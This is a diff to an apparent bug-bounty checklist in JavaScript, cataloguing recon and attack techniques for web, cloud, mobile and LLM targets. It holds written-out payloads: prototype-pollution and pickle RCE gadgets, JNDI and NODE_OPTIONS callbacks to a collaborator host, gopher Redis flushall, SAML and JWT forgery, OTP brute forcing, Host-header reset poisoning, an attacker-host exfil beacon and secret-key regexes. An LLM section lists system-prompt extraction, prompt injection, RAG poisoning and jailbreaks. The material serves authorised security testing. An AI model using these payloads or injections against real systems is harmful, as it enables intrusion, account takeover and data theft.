+			"Validate Google keys against https://generativelanguage.googleapis.com/v1beta/models?key=KEY; look for a 200 model list vs API_KEY_INVALID errors; test File API, referer-restricted keys, corpora persistence and generation endpoints (gemini-2.5-flash, imagen, veo)",
+			"Granular keyword loop (15 groups: password, api_key, secret, jwt, token, aws_secret, 'BEGIN RSA PRIVATE KEY', 'authorization: bearer', 'Set-Cookie:', admin, staging, internal) — curl -s -H \"Authorization: token $GITHUB_TOKEN\" https://api.github.com/search/code?q=%22example.com%22+$q&per_page=100",
+			"Deleted/dangling blob scan after mirror clone: git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(rest)' | awk '$1==\"blob\"{print $2}' + gitleaks detect --no-git -v; dedup forks by file hash before triage",
+			"Email -> GitHub-handle pivot: search victim email/username on GitHub, leaked .git repos, npm author metadata; commit history reveals internal hostnames + deploy scripts"
 		],
 		techniques: ["org: + filename/extension/path dorks", "TruffleHog / gitGraber", "git-dumper + git history recovery", "KeyHacks validation", "Google API key abuse (Gemini/File/corpora/veo)"]
 	},
@@ -872,7 +971,9 @@ const CHECKLIST = [
 			"nuclei -t errorsqli.yaml -dast; look for database error strings in responses",
 			"Swagger UI XSS by appending ?configUrlUrl= with xsscookie.json/login.json payloads; look for cookie-stealing popups or fake login forms",
 			"CRLF: curl -I 'https://domain.com/%0aSet-Cookie:coffin=hi;'; look for the injected header",
-			"Passive pipeline: gau in parallel per subdomain -> uro dedup -> httpx-toolkit liveness -> nuclei over filtered live URLs; look for hits recorded in nuclei_results.txt"
+			"Passive pipeline: gau in parallel per subdomain -> uro dedup -> httpx-toolkit liveness -> nuclei over filtered live URLs; look for hits recorded in nuclei_results.txt",
+			"Multi-step chain template: POST login -> extractors [{type: regex, internal: true}] -> reuse {{token}} in Cookie: session={{token}} of the next request",
+			"Pipeline hygiene: nuclei -store-resp -store-resp-dir for later review; .nuclei-ignore.yaml to silence always-alert templates; curated resolver list (trickest/resolvers); httpx flags -status-code -title -tech-detect -ip -cdn -tls-grab -web-server -json (add -websocket for WS-only services)"
 		],
 		techniques: ["nuclei -t <template> -dast", "coffinxp templates (openRedirect, wp-setup-config, blind-ssrf, errorsqli)", "gau | uro | httpx pipeline", "filtered_urls.txt artifacts"]
 	},
@@ -888,7 +989,10 @@ const CHECKLIST = [
 			"Dork org:target \"aws_secret_key\" in GitHub orgs; look for leaked keys and bucket names",
 			"Recursive aws s3 ls grepping .env/.pem/.key/.sql/.db; look for credentials, backups, configs",
 			"aws s3 cp file.txt s3://[bucketname] --no-sign-request; look for anonymous uploads (Full Control ACL)",
-			"httpx-toolkit -td | grep 'Amazon S3'; look for S3-backed subdomains then test their buckets"
+			"httpx-toolkit -td | grep 'Amazon S3'; look for S3-backed subdomains then test their buckets",
+			"Azure blob twin: dig {name}.blob.core.windows.net then curl -sI https://$h/?comp=list -> anonymous listing; permute name variants (prod/dev/staging/backup/media/static-admin)",
+			"GCP bucket twin: curl -sI https://storage.googleapis.com/$bucket/ -> exists + public listing; ListObjects workarounds when denied: ?max-keys=0, Range: header, key paths guessed from JS",
+			"Firebase twin: mine {name}.firebaseio.com from JS/mobile/wayback then curl -s https://$fb/.json -> open rules = full DB read"
 		],
 		techniques: ["aws s3 ls --no-sign-request", "lazys3 permutations", "s3scanner -enumerate", "JS bucket URL grep (katana -jc)", "anonymous write tests"]
 	},
@@ -918,7 +1022,10 @@ const CHECKLIST = [
 			"Check 404/deleted URLs against Wayback snapshots via the timeline; look for recoverable deleted files still served",
 			"Historical robots.txt snapshots for hidden endpoints; look for disallowed admin/internal paths",
 			"Archived PDFs grepped for confidential keywords (confidential, salary, SSN, bank statement, passport); look for leaked documents",
-			"Wayback browser view (web/*/domain/*) with extension filters; look for archive-only endpoints no longer live"
+			"Wayback browser view (web/*/domain/*) with extension filters; look for archive-only endpoints no longer live",
+			"Resurrected endpoints: harvest CDX 2xx URLs, live-GET each, report 200/401/403 hits NOT in a current crawl (removed-but-live): comm -23 <(sort all_historical) <(sort current) | httpx -mc 200,401,403",
+			"Archive-spec mining: cdx?url=$TARGET/*swagger* & *openapi* (collapse=urlkey) — a DEPRECATED version's spec often stays indexed after the live link is removed; diff .paths keys vs current",
+			"Per-path history: cdx fl=timestamp,original for a specific path (robots.txt, sitemap.xml, .git-credentials), replay each snapshot to diff admin paths / cred files across time"
 		],
 		techniques: ["CDX collapse=urlkey fl=original", "extension filtering (.db .env .zip .sql .bak .pem .key .xls)", "robots.txt snapshot mining", "web/*/domain/* archive filters"]
 	},
@@ -992,7 +1099,9 @@ const CHECKLIST = [
 			"Delimiter injections before extensions (~ \\ / ; : // %60 %5c %3d %2e); look for cache-rule bypasses serving dynamic content",
 			"Combined extension+directory patterns (.js/*, /admin.css/login, /settings/fake.js); look for cached sensitive pages",
 			"Mass hunt: gau filtered to sensitive paths, append /style.css, probe httpx-toolkit -mc 200; look for 200s exposing private pages",
-			"Full exploit in authenticated-then-logged-out flow with incognito verification; look for cached account data (username, email, session_token) served to unauthenticated visitors"
+			"Full exploit in authenticated-then-logged-out flow with incognito verification; look for cached account data (username, email, session_token) served to unauthenticated visitors",
+			"Cache-key analysis: send two identical requests — if Age increments the response is cached; Vary headers one-by-one to find which are NOT in the cache key (unkeyed)",
+			"Catalog to try: Cloudflare Cache-Deception Armor bypass, session-token cache deception, Akamai hop-by-hop smuggling -> server-side edge poisoning, Kettle's 2024 path-normalization WCD against Cloudflare/Fastly/GCP"
 		],
 		techniques: ["append static ext to sensitive endpoints", "X-Cache / CF-Cache-Status / Age verification", "force-cache + forwarded headers", "delimiter battery (~ \\ / ; : %60 %5c %3d)", "gau | httpx mass hunting"]
 	},
@@ -1024,7 +1133,10 @@ const CHECKLIST = [
 			"Discord webhook + Telegram bot token in provider.yaml with -notify both; look for alerts arriving on both platforms",
 			"nohup + @reboot crontab entry logging to /tmp/crtmon.log; look for crtmon restarting after reboot",
 			"Fresh-asset workflow: immediately probe newly alerted subdomains (httpx + nuclei) before automated scanners catch up; look for vulnerable services others haven't touched",
-			"-config custom.yaml to scope different target sets per notification preference; look for correct alert routing per group"
+			"-config custom.yaml to scope different target sets per notification preference; look for correct alert routing per group",
+			"Dead-asset revival: archived-but-undead staging hosts — staging.example.com may still serve even if no longer DNS-live; TLS SNI history via cero (cero example.com | sed 's/^\\\\*\\\\.//'); tlsx -san -cn -ja3 -ja3s for cert reuse/SAN pivots; JARM grouping to find shared TLS stacks (jarm -i ips.txt -o jarm.txt)",
+			"Certstream live trigger: certstream.listen_for_events(cb, url='wss://certstream.calidog.io') — new cert for a target suffix fires the recon pipeline immediately",
+			"Dated-dir pipeline: store run dirs per date, delta-diff against the previous run, notify only on change, keep git persistence"
 		],
 		techniques: ["crtmon real-time CT monitoring", "Discord/Telegram webhook alerts", "fresh-asset httpx+nuclei race", "crt.sh json (name_value + not_before) sorting"]
 	},
@@ -1055,7 +1167,9 @@ const CHECKLIST = [
 			"httpx -l sub.txt -path /.git/config -ms '\\[core\\]' — confirm readable .git/config for repository extraction (see bb_git_exposure)",
 			"gau --subs domain.com | grep -E '\\.(js|mjs)$' | sort -u — collect JS bundles and grep for api_key, secret, token, password, aws (see bb_js_secrets for the automated miner)",
 			"s3scanner scan --bucket-file buckets.txt — scan derived bucket names for open/listable S3 (see bb_s3_probe for the keyless probe)",
-			"Shodan dork: ssl.cert.subject.CN:example.com — find IPs/certificates issued for the org, then check port 80/443 for exposed backup files and admin panels (Shodan API key needed for the full query)"
+			"Shodan dork: ssl.cert.subject.CN:example.com — find IPs/certificates issued for the org, then check port 80/443 for exposed backup files and admin panels (Shodan API key needed for the full query)",
+			"Extend the secret catalog: Slack xoxb-/xoxp-/xapp- tokens, pk_live_/pk_test_ (Stripe), sendgrid/twilio/mailgun API keys, ghu_/ghs_ (GitHub), npm/PyPI/Docker Hub registry tokens, Discord/Telegram bot tokens — order most-specific first so generic catches don't pre-empt typed ones",
+			"Live credential validation (minimal-impact): Slack curl -s -X POST https://slack.com/api/auth.test -H \"Authorization: Bearer $token\" -> ok:true = P1; AWS aws sts get-caller-identity"
 		],
 		techniques: ["extension-based sensitive-file grep", "Google dork ext: battery", ".git exposure httpx -ms 'Index of'", "JS bundle secret grep", "s3scanner bucket scan", "Shodan ssl.cert.subject.CN dork"]
 	},
@@ -1085,7 +1199,8 @@ const CHECKLIST = [
 			"curl -X OPTIONS -H 'Origin: http://evil.com' -H 'Access-Control-Request-Method: GET' -I https://target.com/ — preflight reveals ACAO/ACAC for credentialed cross-origin requests (see bb_cors_scan)",
 			"python3 CORScanner.py -u https://target.com -d -t 10 — automated CORS misconfiguration scanner (checks multiple origins + credentials)",
 			"nuclei -t nuclei-templates/vulnerabilities/cors/ -l targets.txt — template-based CORS checks across the target list",
-			"Impact check: ACAO reflects attacker origin + Access-Control-Allow-Credentials: true + no Vary: Origin — any authenticated endpoint becomes readable cross-origin; confirm with a credentialed fetch from an attacker page"
+			"Impact check: ACAO reflects attacker origin + Access-Control-Allow-Credentials: true + no Vary: Origin — any authenticated endpoint becomes readable cross-origin; confirm with a credentialed fetch from an attacker page",
+			"Decision matrix: ACAO:* + ACAC:true = NOT exploitable (browsers drop credentials with wildcard); ACAO:null + ACAC:true = High via sandboxed iframe; ACAO:*.target.com + ACAC = High if any subdomain is controllable; fixed trusted origin = not exploitable unless you control it"
 		],
 		techniques: ["Origin reflection curl", "null-origin test", "OPTIONS preflight", "CORScanner", "nuclei cors templates"]
 	},
@@ -1100,7 +1215,11 @@ const CHECKLIST = [
 			"intitle:'Welcome to nginx!' OR intitle:'Apache2 Ubuntu Default Page' OR intitle:'IIS Windows Server' — default server pages reveal unhardened hosts (also check /server-status, /phpinfo.php on hits)",
 			"Shodan dork: ssl.cert.subject.CN:example.com — enumerate hosts by certificate CN; filter port 443 + status 200 for live org-owned services",
 			"Shodan dork: http.title:'login' hostname:example.com — find login portals by page title; combine with http.html:password for exposed login forms",
-			"Dork hygiene: validate every hit with httpx before manual testing; Google results lag real exposure, so pair dorks with bb_wayback_urls + bb_ct_fresh_assets for fresher inventory"
+			"Dork hygiene: validate every hit with httpx before manual testing; Google results lag real exposure, so pair dorks with bb_wayback_urls + bb_ct_fresh_assets for fresher inventory",
+			"Error-signature dorks (vuln signal): site:example.com \"Whitelabel Error Page\", \"stack trace\", \"PHP Parse error\", \"Warning: include\", \"ORA-00921\", \"java.lang.NullPointerException\", \"Traceback (most recent call last)\", \"Microsoft VBScript runtime error\", intext:\"sql syntax near\"",
+			"SSO/OAuth dorks: inurl:redirect_uri, inurl:callback, inurl:oauth, inurl:saml, inurl:sso",
+			"Cloud-bucket dorks: site:s3.amazonaws.com \"example\", inurl:digitaloceanspaces.com \"example\", inurl:linodeobjects.com \"example\", inurl:blob.core.windows.net",
+			"Vendor-management dorks: inurl:jira, inurl:confluence, inurl:jenkins, inurl:gitlab, inurl:bamboo, inurl:crowd, inurl:slack; source-control dorks: inurl:.git, inurl:.svn, inurl:.hg, inurl:.DS_Store, inurl:.idea, inurl:dump.sql"
 		],
 		techniques: ["site: ext: dork battery", "intitle:'index of' dorks", "inurl:.env/config dorks", "default-server title dorks", "Shodan ssl.cert.subject.CN", "Shodan http.title login"],
 	},
@@ -1142,7 +1261,8 @@ const CHECKLIST = [
 			"Python pickle: __reduce__ gadget — import os; class RCE: ... __reduce__ returns (os.system, ('id',)) — spot pickle via protocol magic (\\x80\\x04) or 'c__builtin__' bytecode strings",
 			"PHP object injection: phpggc gadget chains (Laravel, Symfony, Guzzle, Monolog) via unserialize() sinks; Ruby Marshal.load; JNDI/Log4Shell ${jndi:ldap://collab/a} in any logged field",
 			"Chain gates: deserialization bugs are only reportable with a working command-execution payload for YOUR target; URLDNS/sleep-only gating is recon, not a finding",
-			"Look for the serialization surface first: /api/objects?format=json vs format=java, XML-RPC endpoints (wordpress xmlrpc, WebLogic wls-wsat), JSF ViewState, session serialized in cookies (PHPSESSID base64-decodes to PHP object)"
+			"Look for the serialization surface first: /api/objects?format=json vs format=java, XML-RPC endpoints (wordpress xmlrpc, WebLogic wls-wsat), JSF ViewState, session serialized in cookies (PHPSESSID base64-decodes to PHP object)",
+			"Cookie/header magic bytes: rO0 (Java), O: (PHP object injection, e.g. O:8:\"stdClass\" no-error probe), pickle \\x80\\x04"
 		],
 		techniques: ["ysoserial chain battery", "ysoserial.net ViewState", "pickle __reduce__", "phpggc object injection", "JNDI Log4Shell", "0xaced/ViewState detection"]
 	},
@@ -1156,7 +1276,8 @@ const CHECKLIST = [
 			"kid injection: kid='../../../dev/null' or 'file:///dev/null' with empty secret -> empty HMAC; kid SQLi in the key-lookup query; jku/x5u -> attacker-controlled jwks (host your own key set and let server fetch it)",
 			"Crack weak secrets offline: hashcat -m 16500 token.txt or john — HMAC-SHA256 tokens with weak secrets crack in seconds; then forge admin tokens",
 			"exp/iat/nbf enforcement: replay an expired token, try no-expiration tokens, check clock-skew acceptance (exp = now + 24h often accepted)",
-			"Cross-tenant/audience confusion: swap aud/iss fields, replay a token minted for app A against app B (Argo CD CVE-2023-22482 pattern); JWT-as-session: logout/password change must invalidate — see session-management"
+			"Cross-tenant/audience confusion: swap aud/iss fields, replay a token minted for app A against app B (Argo CD CVE-2023-22482 pattern); JWT-as-session: logout/password change must invalidate — see session-management",
+			"Hasura JWT forgery HS512 with x-hasura-role / x-hasura-user-id claims"
 		],
 		techniques: ["alg:none forgery", "RS256->HS256 key confusion", "kid/jku/x5u injection", "hashcat -m 16500 cracking", "exp/aud confusion", "jwt_tool/jwt-cracker"]
 	},
@@ -1170,7 +1291,14 @@ const CHECKLIST = [
 			"Batching for brute force/rate-limit bypass: array-form requests [{'query':...},{'query':...}] — send 100 login attempts in one request",
 			"CSRF via GET: many GraphQL servers accept query-string queries — <img src='/graphql?query={mutation{...}}'> cross-site; mutation injection: turn a read schema into a mutation via introspection-guided field reuse",
 			"SSRF/SQLi through field args: look for url/fetch/import args on resolvers; depth DoS: nested aliasing without depth limit; also test /graphql?query= in GET for caching/CDN poisoning",
-			"IDE endpoints leak schema/mutations: /graphiql, /playground, /altair, /voyager, /graphql/console (Hasura) — always probe before hand-fuzzing"
+			"IDE endpoints leak schema/mutations: /graphiql, /playground, /altair, /voyager, /graphql/console (Hasura) — always probe before hand-fuzzing",
+			"Single-type introspection when __schema is disabled: __type(name:\"User\"){fields{name type{name kind}}}",
+			"Batching bypass: JSON-array of 1000 login attempts in ONE request defeats per-request rate limits (HTTP/1.1 pipelined aliases)",
+			"Suggestions leak schema: incomplete query error 'Did you mean user? users? userAdmin?' enumerates field names without introspection",
+			"Query-depth/complexity DoS — reportable ONLY with measurable degradation (baseline vs deep-nested query latency/size)",
+			"Mutation-level auth missing while queries are gated — test mutations with the low-priv session",
+			"Injection via variables: SQLi/NoSQLi/SSTI through search/filter/sort arguments, not only literals",
+			"Alias-based amplification: repeat a costly field under many aliases in one query (abuse of batching costs)"
 		],
 		techniques: ["bb_graphql_introspection", "alias/batch bypass", "field-IDOR swap", "GET-CSRF mutation", "clairvoyance fuzzing", "IDE endpoint hunt"]
 	},
@@ -1198,7 +1326,9 @@ const CHECKLIST = [
 			"Single-packet attack: Turbo Intruder with engine=Engine.BURP2 + gate sync; Burp Repeater 'send group in parallel'; curl: for i in 1..N; do curl ... & done; HTTP/2 single-packet sends all requests in one TCP segment",
 			"High-value targets: coupon/gift-card redeem-once, wallet transfer balance check, signup bonus, email/SMS OTP reuse, like/follow counts, price-change TOCTOU on checkout (add item after price check)",
 			"Statistical bar: a single anomalous response is noise — require 1 successful + N duplicate/over-quota/stale-state demonstrations with response screenshots (Kettle DEF CON 2023 'Smashing the State Machine')",
-			"Defense-aware: test against sessions NOT the anonymous path first; some apps serialize per-user (fixation-style) — use two sessions A and B to prove cross-user race"
+			"Defense-aware: test against sessions NOT the anonymous path first; some apps serialize per-user (fixation-style) — use two sessions A and B to prove cross-user race",
+			"Multi-endpoint: transfer + withdraw racing the same balance",
+			"What-to-race table: coupon, like/unfollow, upload-race, balance, invite-quota, password-reset+login"
 		],
 		techniques: ["identical-copies race", "partial-construction race", "Turbo Intruder single-packet", "HTTP/2 h2 race", "coupon/OTP double-redeem", "register+blank-token"]
 	},
@@ -1212,7 +1342,10 @@ const CHECKLIST = [
 			"$where blind injection: {'q': {'$where': 'function(){var d=new Date();while(new Date()-d<5000){}; return true;}'}} — timing oracle; then exfil chars via conditional sleeps",
 			"Operator side effects: $ne on a field the query uses for authz, $regex with ReDoS-able patterns, $expr/$function for newer MongoDB; test every JSON body param, not just login",
 			"Redis via SSRF: gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a — Gopher + Redis protocol; also MongoDB on 27017 via gopher",
-			"Chain: NoSQLi in a search filter (users, orders) = mass data read; in an update filter = mass-assignment territory — pair with bb_mass_assign_gen"
+			"Chain: NoSQLi in a search filter (users, orders) = mass data read; in an update filter = mass-assignment territory — pair with bb_mass_assign_gen",
+			"$exists:false — password field need not exist; $in array operator; URL bracket params password[$gt]= (qs library)",
+			"Redis CRLF CONFIG SET shell; GraphQL filter objects (_gt) + JSON-string filter args",
+			"Mongo signs: CastError/MongoError/ObjectId, 24-hex ObjectIds, _id in JSON, .find({ in JS"
 		],
 		techniques: ["bb_nosqli_auth_probe", "$gt/$regex/$ne bypass", "$where blind timing", "unicode/array bypass", "gopher Redis SSRF", "$expr advanced ops"]
 	},
@@ -1240,7 +1373,10 @@ const CHECKLIST = [
 			"Token reuse: exchange an auth_code twice, replay refresh tokens, refresh-token rotation absence — a leaked refresh minting tokens forever",
 			"SAML XSW (XML Signature Wrapping): inject a second <saml:Assertion ID='evil'> with <NameID>admin@company.com</NameID> BEFORE the signed one — apps process the FIRST assertion found (10/10 triage = Critical ATO)",
 			"SAML comment injection: <NameID>admin@company.com<!---->.evil.com</NameID> — signer C14N and app text-extraction disagree (CVE-2017-11428/CVE-2016-5697); signature stripping: remove <ds:Signature> entirely, re-encode, POST to /saml/acs (wantAssertionsSigned=false)",
-			"Legacy-Protocol Matrix: probe legacy auth endpoints anonymously — WordPress /xmlrpc.php, Tomcat /manager/html, WebLogic /console/login/LoginForm.jsp + /wls-wsat/*, Oracle EBS /OA_HTML/AppsLogin, PeopleSoft /psp/*/?cmd=login; DNS signals: cookie domain .company.com wildcard, SAMLResponse POST bodies (Burp passive trigger)"
+			"Legacy-Protocol Matrix: probe legacy auth endpoints anonymously — WordPress /xmlrpc.php, Tomcat /manager/html, WebLogic /console/login/LoginForm.jsp + /wls-wsat/*, Oracle EBS /OA_HTML/AppsLogin, PeopleSoft /psp/*/?cmd=login; DNS signals: cookie domain .company.com wildcard, SAMLResponse POST bodies (Burp passive trigger)",
+			"response_type confusion: response_type=token (implicit grant) leaks the token into URL/Referer vs response_type=code",
+			"Token/code in Referer to third-party scripts; OAuth state replay — capture a callback then replay with different state = CSRF on OAuth = ATO",
+			"SAML: signature stripping, XML comment injection (CVE-2017-11427-30), XXE in SAML, XSW variants"
 		],
 		techniques: ["redirect_uri differential", "state/PKCE CSRF", "token re-exchange", "SAML XSW injection", "SAML signature strip", "legacy-login matrix"]
 	},
@@ -1254,7 +1390,9 @@ const CHECKLIST = [
 			"OTP brute (6-digit = 1,000,000): ffuf -u 'https://target.com/api/reset/verify' -X POST -d '{\"email\":\"victimB@company.com\",\"code\":\"FUZZ\"}' -w <(seq -w 000000 999999) -fc 400,429 -t 5; 000000/111111 first",
 			"Prefix oracle: if the server validates only the FIRST digits/characters, <=60 guesses can complete a 6-digit code — probe by sending codes that differ in trailing digits and watching response variance",
 			"Concurrent sliding-window (captcha-style counter): fire the brute force CONCURRENTLY (concurrency N >= counter width) so attempts arrive together and defeat per-window counters",
-			"Factor downgrade: push-fatigue spam, SMS/voice fallback enabled while TOTP required, security-question fallback, backup codes not invalidated after use (Okta chain: spray -> MFA challenge -> factor-downgrade -> session)"
+			"Factor downgrade: push-fatigue spam, SMS/voice fallback enabled while TOTP required, security-question fallback, backup codes not invalidated after use (Okta chain: spray -> MFA challenge -> factor-downgrade -> session)",
+			"Client-side response manipulation: {\"verified\":false}->true in the OTP-verify response",
+			"OTP reuse — same code accepted twice; OTP brute-force with X-Forwarded-For/X-Real-IP/CF-Connecting-IP rotation"
 		],
 		techniques: ["skip-step probe", "OTP replay", "ffuf seq -w 000000-999999", "prefix oracle", "concurrent bypass", "factor downgrade"]
 	},
@@ -1282,7 +1420,9 @@ const CHECKLIST = [
 			"Replay: submit the same token twice — second 200/success = token not invalidated; try replaying on a different user, after password change, and after expiry",
 			"Weak token shapes: base64(email + timestamp) — decodable; 4-6 digit numeric code — 10K guesses; sequential token=1234 -> token=1235; UUID v1 timestamps",
 			"Host-header poisoning: POST /forgot-password with Host: attacker.com / X-Forwarded-Host / X-Host / dual-Host 'Host: target.com\\r\\nHost: attacker.com' — reset email links to attacker domain; FALSE-POSITIVE KILLER: read the actual email, don't infer from the reflected header (server-pinned link domains are common)",
-			"Blank-token acceptance: GET /confirm?token= (empty) raced against registration — see race-condition; no-expiry: a token that never expires and works after dozens of uses"
+			"Blank-token acceptance: GET /confirm?token= (empty) raced against registration — see race-condition; no-expiry: a token that never expires and works after dozens of uses",
+			"Token REUSE without invalidation: use the reset link, use it AGAIN on the same/new account — critical if not invalidated",
+			"Parallel reset-token race; PRNG sequential/timestamp token prediction (request 5 resets, compare counters/timestamps)"
 		],
 		techniques: ["response-diff enum", "token-in-response", "replay/reuse", "weak token shapes", "Host-header reset poisoning", "blank token race"]
 	},
@@ -1310,7 +1450,9 @@ const CHECKLIST = [
 			".git exposure: /.git/HEAD, /.git/config (see bb_git_exposure); git-dumper $TARGET/.git/ /tmp/repo/ then trufflehog filesystem /tmp/repo/ for secrets in history",
 			"Build info: /build-info.json /info.json /version.json leak git commit hash + build timestamp + dependency versions -> CVE targeting",
 			"Asset manifests: /asset-manifest.json lists ALL chunk paths (CRA), enabling targeted map fetches; /service-worker.js precache list similarly leaks file inventory",
-			"Severity gate: .env with credentials = Critical; source map with secrets = High; robots.txt only = Informational; NOTE to client: redeploying doesn't fix map exposure — only GENERATE_SOURCEMAP=false + CDN purge does"
+			"Severity gate: .env with credentials = Critical; source map with secrets = High; robots.txt only = Informational; NOTE to client: redeploying doesn't fix map exposure — only GENERATE_SOURCEMAP=false + CDN purge does",
+			"X-Debug-Token header = Symfony profiler exposed — open /_profiler/<token> paths",
+			"HTML comments: TODO-remove-before-prod, credentials/paths in comments; actuator alt paths when /actuator is blocked (/actuator/env, /env, /health)"
 		],
 		techniques: ["bb_source_leak_scan", "quick-win path loop", ".js.map rotation", "git-dumper + trufflehog", "asset-manifest inventory", "build-info CVE targeting"]
 	},
@@ -1366,7 +1508,9 @@ const CHECKLIST = [
 			"Per-message auth: many apps auth the HANDSHAKE but not each message — after handshake, send messages referencing other users/rooms without re-auth",
 			"Namespace/room authz (socket.io): join rooms you weren't granted (room enumeration, wildcard namespaces), read other rooms' broadcast traffic; Phoenix/SignalR channel authz analogues",
 			"Fingerprint CVEs: websocket-extensions ReDoS CVE-2020-7662 via crafted Sec-WebSocket-Extensions header; ws (Node) DoS CVE-2024-37890",
-			"Validation bar: REJECT a 101 alone, accepted-but-ignored frames, self-echoed messages, connected-but-empty namespaces — require out-of-band or cross-account proof (another user's data arrives)"
+			"Validation bar: REJECT a 101 alone, accepted-but-ignored frames, self-echoed messages, connected-but-empty namespaces — require out-of-band or cross-account proof (another user's data arrives)",
+			"Rapid-fire rate limit on WS messages; message size limits",
+			"wscat CLI for interactivity; postMessage/mXSS adjacent sinks reached from WS-pushed HTML"
 		],
 		techniques: ["CSWSH Origin test", "per-message auth gap", "socket.io room authz", "CVE-2020-7662/37890", "JS ws discovery grep", "cross-account proof"]
 	},
@@ -1394,7 +1538,10 @@ const CHECKLIST = [
 			"RCE sink: '\"__proto__\": {\"shell\": \"node\", \"NODE_OPTIONS\": \"--require /proc/self/fd/0\", \"env\": {\"NODE_OPTIONS\": \"--inspect=COLLAB_HOST\"}}' — spawn child_process with polluted options; EJS SSTI: {{= process.mainModule.require('child_process').execSync('id') }}",
 			"Auth bypass: pollute isAdmin/role/verified via JSON; mass-assignment interplay — see bb_mass_assign_gen for the key battery",
 			"DOM: polluting innerHTML/textContent defaults drives client-side XSS without a classic reflection point; test via location parsing + JSON.parse of attacker data",
-			"Detection matrix: JSON.parse + deep-merge (lodash merge/defaultsDeep, jQuery.extend), Object.assign chains, express.json + qs; Node <20 Object.prototype holes (CVE-2022-29078 etc.)"
+			"Detection matrix: JSON.parse + deep-merge (lodash merge/defaultsDeep, jQuery.extend), Object.assign chains, express.json + qs; Node <20 Object.prototype holes (CVE-2022-29078 etc.)",
+			"Server-side detection: {\"__proto__\":{\"status\":444}} then fetch /admin — 444 = polluted; {\"__proto__\":{\"json spaces\":10}} + exposedHeaders pollution",
+			"Pug outputFunctionName RCE gadget; child_process shell:true + env NODE_OPTIONS --require /proc/self/environ",
+			"DOM Invader gadget finder; constructor[prototype][x] and fragment #__proto__[x] variants"
 		],
 		techniques: ["constructor.prototype isAdmin", "__proto__[x]=y qs", "NODE_OPTIONS RCE", "EJS process.mainModule", "DOM innerHTML pollution", "deep-merge gadgets"]
 	},
@@ -1408,7 +1555,9 @@ const CHECKLIST = [
 			"Unkeyed X-Forwarded-Host: 403-eligible via evil host -> poisoned page served to everyone; X-Original-URL/X-Rewrite-URL unkeyed = request-splitting cache poisoning",
 			"Web Cache Deception: /account/profile/nonexistent.css — append static suffix so the CDN caches the dynamic page; Kettle 2024 path-normalization WCD vs Cloudflare/Fastly/GCP; Cache Deception Armor bypass variants",
 			"Sensitive-data caching: session/account pages served from cache (Age on /account) — see bb_cache_deception_scan; also caching of API responses with auth headers omitted",
-			"CDN quirks: Akamai hop-by-hop (Connection/TE) smuggling -> edge poisoning; CF-Cache-Status HIT on dynamic paths; Vary: Origin missing = cross-user cache (CORS-adjacent)"
+			"CDN quirks: Akamai hop-by-hop (Connection/TE) smuggling -> edge poisoning; CF-Cache-Status HIT on dynamic paths; Vary: Origin missing = cross-user cache (CORS-adjacent)",
+			"Query-parameter order divergence; fragment handling",
+			"Unkeyed-header test list: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, X-Rewrite-URL"
 		],
 		techniques: ["bb_cache_key_probe", "Age/X-Cache analysis", "?cb= safe MISS test", "WCD static suffix", "X-Forwarded-Host unkeyed", "Akamai hop-by-hop"]
 	},
@@ -1422,7 +1571,10 @@ const CHECKLIST = [
 			"RAG/vector-store poisoning: data ingested into the vector DB can carry instructions; check which sources the model trusts (uploaded docs, URLs) and whether citations reveal internal docs",
 			"Chatbot-mediated IDOR: prompt-injection -> IDOR via chatbot (read other users' data) = report the CHAIN: prompt injection -> IDOR -> exfil beacon <img src='attacker?d=USER_DATA'>",
 			"Tool/function-call abuse: LLM endpoints exposing tools (search/email/send) — prompt the model to invoke tools on attacker-controlled inputs (SSRF-ish tool args)",
-			"Rate/abuse: LLM endpoints with no rate limit = cost abuse; leak of conversation history across sessions; fintech GraphQL+LLM API abuse classes (hunt-llm-ai merges)"
+			"Rate/abuse: LLM endpoints with no rate limit = cost abuse; leak of conversation history across sessions; fintech GraphQL+LLM API abuse classes (hunt-llm-ai merges)",
+			"Categorized red-team corpus: prompt-injection, jailbreak, system-prompt-leak, data-exfil, indirect-injection, guardrail-bypass; pair with canary-token detection",
+			"Denial-of-wallet / token-cost exhaustion via long-input flooding; multimodal injection gap",
+			"LLM output -> dangerous sink testing (XSS/SSRF/SQLi when model output reaches browser/backend); multi-turn crescendo jailbreaks"
 		],
 		techniques: ["system-prompt extraction", "indirect prompt injection", "RAG poisoning", "chatbot IDOR chain", "tool-call abuse", "conversation leak"]
 	},
@@ -1436,7 +1588,11 @@ const CHECKLIST = [
 			"iOS OTA: itunes lookup https://itunes.apple.com/lookup?bundleId=com.<brand>.app&country=us; enterprise builds via itms-services:// manifest.plist <key>software-package</key> -> directly downloadable UNENCRYPTED IPA",
 			"TestFlight builds are frequently LESS hardened than App Store releases — test every beta channel; app-store diff: an API endpoint removed from the store build but live in beta",
 			"API surface from the app: extract base URLs + endpoints, then run the full checklist against them (IDs, authz, shadow-api versions); mobile API often lags web auth fixes",
-			"Device-side: cert-pinning bypass (Frida/objection), root/emulator detection off in release, hardcoded API keys with elevated perms, Firebase realtime-DB with open rules quoted in the app"
+			"Device-side: cert-pinning bypass (Frida/objection), root/emulator detection off in release, hardcoded API keys with elevated perms, Firebase realtime-DB with open rules quoted in the app",
+			"APK static extraction: rg -nIE 'https?://[a-zA-Z0-9./_?=&%-]+' ext/ and (api[_-]?key|secret|token|password|jwt|firebase|aws_(access|secret)|sk_(live|test)_)",
+			"Exported-component audit: xmlstarlet sel -t -m '//activity[@android:exported=\"true\"]' -v '@android:name' -n ext/AndroidManifest.xml; android:usesCleartextTraffic=\"true\" + WebView addJavascriptInterface = RCE-ish sinks",
+			"Hardcoded-key abuse chains: Firebase web key low-risk alone but + Firestore rules = full DB; Algolia admin vs search-only key; Mapbox keys abused for DoS",
+			"App-only API endpoints are often unauth ('no auth on some routes assuming only mobile clients hit this'); insecure deep links example://login?token=... -> ATO chains"
 		],
 		techniques: ["APKPure mirror pull", "jadx secret grep", "iOS OTA manifest.plist", "TestFlight beta diff", "API surface re-hunt", "Frida pinning bypass"]
 	},
@@ -1450,7 +1606,10 @@ const CHECKLIST = [
 			"Key-pattern catalog (order matters, most-specific first): AWS \\b(AKIA|ASIA)[0-9A-Z]{16}\\b; GitHub ghp_/github_pat_; Azure AccountKey=[A-Za-z0-9+/=]{86}; GCP service_account JSON; Anthropic sk-ant-; OpenAI sk-proj-; Stripe sk_live_",
